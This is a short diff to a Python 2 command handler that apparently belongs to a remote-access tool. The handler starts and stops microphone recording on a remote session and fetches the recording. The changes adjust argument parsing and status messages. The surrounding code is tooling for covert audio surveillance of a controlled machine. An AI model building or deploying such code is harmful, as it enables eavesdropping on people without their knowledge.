@@ -40,11 +40,12 @@ class command:
                     print self.usage
             	    return
 		
-        if cmd_data['args'] == "stop":
+        if cmd_data['args'].split()[0] == "stop":
 	    dest = cmd_data['args'].split()[1]
+	    cmd_data['args'] = "stop"
             if os.path.isdir(dest):
                 if os.path.exists(dest):
-		    h.info_general("Recording mic...")
+		    h.info_general("Stopping record...")
                     result = json.loads(session.send_command(cmd_data))
                     if 'error' in result:
                         h.info_error("Failed to record mic!")
@@ -70,6 +71,7 @@ class command:
 		    if os.path.isdir(rp):
 			pr = os.path.split(dest)[0]
                         rp = os.path.split(dest)[1]
+			h.info_general("Stopping record...")
                         result = json.loads(session.send_command(cmd_data))
                         if 'error' in result:
                             h.info_error("Failed to record mic!")
@@ -88,5 +90,6 @@ class command:
                     h.info_error("Local directory: "+rp+": does not exist!")
         
         elif cmd_data['args'].split()[0] == "start":
-            h.info_general("Recording mic...")
+	    cmd_data['args'] = "record"
+            h.info_general("Starting record...")
             session.send_command(cmd_data)
